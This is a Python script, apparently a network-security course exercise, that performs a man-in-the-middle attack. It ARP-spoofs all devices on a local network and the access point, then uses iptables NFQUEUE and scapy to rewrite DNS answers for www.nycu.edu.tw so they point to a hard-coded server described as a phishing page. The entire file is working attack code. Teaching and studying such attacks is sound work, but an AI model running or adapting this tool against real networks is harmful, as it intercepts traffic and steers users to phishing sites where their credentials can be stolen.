#!/usr/bin/env python3

import mitm_attack as mitm
from mitm_attack import COLOR, AP_IP, cmd
from scapy.all import *
from netfilterqueue import NetfilterQueue

QUEUENUM = 0
TARGET_DOMAIN_NAME = b'www.nycu.edu.tw.'
ATTACKER_SERVER = '140.113.207.237'

def dns_spoof_reply(packet):
    """Spoof DNS response packet

    Modify the answer field to Attack server IP
    
    :param packet: scapy packet
    """
    # create DNS response with attacker server as answer
    dnsan = DNSRR(rrname=packet[DNS][DNSQR].qname, rdata=ATTACKER_SERVER)
    dns = DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=dnsan, ancount=1)
    # update DNS layer
    packet[DNS] = dns
    # delete checksum and  length (since modified), scapy will recalculate them
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet

def queue_callback(pkt):
    """Netfilter queue callback function

    The function is called when a new packet is redirected to the netfilter queue.
    Modify DNS reply packets with qname www.nycu.edu.tw.

    :param pkt: netfilter queue packet
    """
    # convert netfilter queue packet into scapy packet
    packet = IP(pkt.get_payload())

    # check layers
    if packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSRR):
        if packet[DNS][DNSQR].qname == TARGET_DOMAIN_NAME:
            # print original packet
            print('original:', packet.summary())
            # spoof dns reply packet
            packet = dns_spoof_reply(packet)
            print('modified:', packet.summary())
    
    # convert back to netfilter queue packet and accept it
    pkt.set_payload(bytes(packet))
    pkt.accept()
        
def dns_spoofing():
    """DNS spoofing

    Whenever a packet is forwarded, redirect it to the netfilter queue number 0.
    Redirect NYCU home page (www.nycu.edu.tw) to phishing page (140.113.207.237).
    """
    # set iptable rule on forwarding
    cmd(f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUENUM}')

    # filtering and redirecting packets
    queue = NetfilterQueue()
    try:
        print()
        print(COLOR.YELLOW + 'Start DNS spoofing.' + COLOR.RESET)
        print(COLOR.VIOLET + 'To stop DNS spoofing, press ctrl+c.' + COLOR.RESET)
        # bind the queue number (0) to the callback function and start it
        queue.bind(QUEUENUM, queue_callback)
        queue.run()
    except KeyboardInterrupt:
        # remove the rules
        cmd("iptables --flush")
        print(COLOR.RED + 'Stop DNS spoofing.' + COLOR.RESET)
        return

def main():
    """Main program

    1. Scan available devices IPs and MACs
    2. ARP spoofing
    3. DNS spoofing
    """
    # get available devices information
    inf, ip_mac_dict = mitm.scan_ip_mac()
    # Send spoofed ARP packets to all devices first (to become a middle man)
    mitm.arp_spoofing_by_all(inf, ip_mac_dict, ATTACKER_SERVER)
    ip_mac_dict[ATTACKER_SERVER] = 'none' # server to AP
    mitm.arp_spoofing_by_all(inf, ip_mac_dict, AP_IP)
    # task 4
    dns_spoofing()

if __name__ == '__main__':
    main()